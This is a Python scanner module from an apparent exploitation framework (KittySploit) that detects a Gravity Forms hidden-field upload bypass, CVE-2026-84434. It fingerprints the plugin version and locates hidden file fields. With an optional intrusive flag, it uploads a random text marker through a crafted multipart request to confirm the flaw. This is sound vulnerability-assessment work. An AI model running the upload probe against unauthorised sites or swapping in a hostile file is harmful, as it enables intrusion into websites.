#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Gravity Forms <= 3.1.0.4 hidden field upload bypass (CVE-2026-84434)."""

from __future__ import annotations

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "gravityforms"
_VULN_HIGH = (3, 1, 0)
_SCAN_PATHS = (
    "/",
    "/contact/",
    "/contact-us/",
    "/get-in-touch/",
    "/support/",
    "/apply/",
    "/register/",
    "/donate/",
    "/quote/",
    "/book/",
)
_HIDDEN_FORM_RE = re.compile(
    r"gfield_visibility_hidden[\s\S]{0,900}?"
    r"(?:name=[\"'](input_[0-9]+(?:_[0-9]+)?)[\"'][^>]*type=[\"']file[\"']"
    r"|type=[\"']file[\"'][^>]*name=[\"'](input_[0-9]+(?:_[0-9]+)?)[\"'])",
    re.I,
)
_WRAPPER_RE = re.compile(r'id=["\']?gform_wrapper_([0-9]+)["\']?', re.I)
_UNIQUE_ID_RE = re.compile(r'name=["\']gform_unique_id["\'][^>]*value=["\']([^"\']*)["\']', re.I)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Gravity Forms CVE-2026-84434 hidden upload detect",
        "description": (
            "CVE-2026-84434: hidden gfield_visibility_hidden file fields skip "
            "extension checks on Gravity Forms <= 3.1.0.4."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-84434",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-84434",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-84434.yaml",
        ],
        "tags": ["web", "scanner", "wordpress", "gravityforms", "file-upload", "cve-2026-84434"],
        "agent": {"approval_required": True, "risk": "active"},
    }

    active_probe = OptBool(
        False,
        "Upload marker via hidden file field (intrusive)",
        required=False,
    )

    def _plugin_ok(self) -> tuple[str, bool]:
        version = self.wp_plugin_version(_PLUGIN, "/") or ""
        check = self.http_request(
            method="GET",
            path="/wp-content/plugins/gravityforms/gravityforms.php",
            allow_redirects=True,
        )
        present = bool(check and int(check.status_code) == 200)
        if not present:
            readme = self.http_request(
                method="GET",
                path=f"/wp-content/plugins/{_PLUGIN}/readme.txt",
                allow_redirects=True,
            )
            present = bool(readme and int(readme.status_code) == 200)
            if present and not version:
                version = self.wp_extract_version_from_readme(readme.text or "") or ""
        return version, present

    def _find_surface(self) -> tuple[str, str, str, str]:
        for path in _SCAN_PATHS:
            page = self.http_request(method="GET", path=path, allow_redirects=True)
            if not page or int(page.status_code) != 200:
                continue
            body = page.text or ""
            if "gravityforms" not in body.lower():
                continue
            if "gfield_visibility_hidden" not in body or "gfield--type-fileupload" not in body:
                continue
            wrap = _WRAPPER_RE.search(body)
            hidden = _HIDDEN_FORM_RE.search(body)
            if not wrap or not hidden:
                continue
            input_name = (hidden.group(1) or hidden.group(2) or "").strip()
            if not input_name:
                continue
            uid = _UNIQUE_ID_RE.search(body)
            return path, wrap.group(1), input_name, uid.group(1) if uid else ""
        return "", "", "", ""

    def _upload_marker(self, page_path: str, form_id: str, field: str, unique_id: str) -> bool:
        marker = f"KS{secrets.token_hex(8)}"
        fname = secrets.token_hex(5)
        boundary = f"Kitty{secrets.token_hex(6)}"
        parts = [
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="is_submit_{form_id}"\r\n\r\n1\r\n',
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"gform_submit\"\r\n\r\n{form_id}\r\n",
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="gform_unique_id"\r\n\r\n{unique_id}\r\n',
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="gform_target_page_number_{form_id}"\r\n\r\n0\r\n',
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="gform_source_page_number_{form_id}"\r\n\r\n1\r\n',
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field}"; filename="{fname}.txt"\r\n'
            f"Content-Type: text/plain\r\n\r\n{marker}\r\n",
            f"--{boundary}--\r\n",
        ]
        body = "".join(parts)
        post = self.http_request(
            method="POST",
            path=page_path,
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            allow_redirects=True,
            timeout=45,
        )
        if not post or int(post.status_code) not in (200, 302):
            return False
        text = post.text or ""
        if not any(x in text for x in ("gf-download", "gravity_forms", "gform_confirmation")):
            return False
        match = re.search(r'href=["\']([^"\']*gf-download=[^"\']+)["\']', text)
        verify_path = match.group(1) if match else ""
        if not verify_path:
            match = re.search(r"(index\.php\?gf-download=[^\"'<>\\s]+)", text)
            verify_path = match.group(1) if match else ""
        if not verify_path:
            return False
        if verify_path.startswith("http"):
            from urllib.parse import urlparse

            verify_path = urlparse(verify_path).path + "?" + urlparse(verify_path).query
        verify = self.http_request(method="GET", path=verify_path, allow_redirects=True)
        return bool(verify and marker in (verify.text or ""))

    def run(self):
        version, present = self._plugin_ok()
        if not present:
            return False
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        page, form_id, field, unique_id = self._find_surface()
        if not page:
            self.set_info(
                severity="medium",
                cve="CVE-2026-84434",
                reason=(
                    f"Gravity Forms {version or 'unknown'} affected range; "
                    "no hidden file upload field on common paths"
                ),
                version=version or "unknown",
            )
            return True
        if not self.active_probe:
            self.set_info(
                severity="high",
                cve="CVE-2026-84434",
                reason=(
                    f"Hidden Gravity Forms file field on {page} (form {form_id}); "
                    "upload not attempted"
                ),
                version=version or "unknown",
            )
            return True
        if not self._upload_marker(page, form_id, field, unique_id):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-84434",
            reason="Hidden file field upload verified via gf-download",
            version=version or "unknown",
            confidence="high",
        )
        return True
